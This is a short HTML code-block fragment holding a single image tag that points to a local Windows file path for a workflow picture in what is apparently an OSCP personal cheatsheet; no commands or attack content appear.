 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><img src="D:\Workspace\2022\OSCP\OSCP personal cheatsheet_files\Workflow.jpg">
 </code></pre></div></div>
